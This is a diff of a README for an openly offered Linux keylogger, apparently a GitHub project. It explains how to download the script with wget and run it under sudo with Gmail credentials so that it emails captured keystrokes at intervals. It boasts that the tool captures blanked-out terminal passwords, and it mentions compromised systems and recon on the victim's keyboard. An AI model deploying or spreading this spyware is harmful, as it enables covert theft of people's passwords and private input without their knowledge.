@@ -7,15 +7,17 @@ This keylogger runs in the background and copies all the keystrokes a user input
 
 The logger is heavily based on the logger written by [x4nth055](https://github.com/x4nth055). 
 
-I added the ability to feed in an email address and password, rather than hardcode it in, the ability to feed in how oftem you want the script to report back to you, as well as an experimental attempt to report special chracter key strokes.
+I added the ability to feed in an email address and password rather than hardcode it in, the ability to feed in how often you want the script to report back to you, as well as an experimental attempt to report special character key strokes.
+
+This logger is capable of collecting the keystrokes for 'blanked out' passwords in a 'nix terminal
 
 ### Prerequisites
 
 This logger has been built on a number of assumptions:
-* You've can run sudo on a comprimised linux system
+* You've can run sudo / run as root on a linux system
 * You have access to Gmail, and have turned on 'less secure app access' in your security settings
 
-You'll need to install the following modules, if you don't already have them:
+You'll need to install the following modules:
 ```bash
 pip3 install keyboard
 pip3 install argparse
@@ -27,7 +29,7 @@ wget https://raw.githubusercontent.com/Purp1eW0lf/Keylogger/main/logger.py
 ### Usage
 This logger requires you to feed your gmail email and password. I would create a throwaway account for this. 
 
-You can also optionally feed the script the length of time you want it to wait and send you an email of the keystrokes. The default waiting period is 60 seconds, should you chooe not to input length (the -l flag)
+You can also optionally feed the script the length of time you want it to wait and collect keystrokes, and send you an email of the keystrokes. The default waiting period is every 60 seconds, should you choose not to input length (the -l flag)
 
 ```bash
 sudo python3 logger.py -e gmail@Address -p Password -l 120
@@ -51,7 +53,7 @@ sudo python3 logger.py -e gmail@Address -p Password -l 120
 Sometimes the emails don't send at the regular interval, but will come in batch and you'll get a handful at once
 * Fix: I'm not clever enough to figure out why yet.
 
-The script tries to tranpose special characters by examining is the user presses the SHIFT key and a corresponding number. This is majorly flawed, however, as it is entirely dependent on the type/brand/langugage of the keyboard. The current script is based on a Macbook keyboard. 
+The script tries to tranpose special characters by examining if the user presses the SHIFT key and a corresponding number. This is majorly flawed, however, as it is entirely dependent on the type/brand/langugage of the keyboard. The current script is based on a Macbook keyboard. 
 * Fix: If you're able to do some recon on the user's keyboard type, you can change the section in the middle of the script, and reassign the key values for better accuracy. 
 
 ### Contact
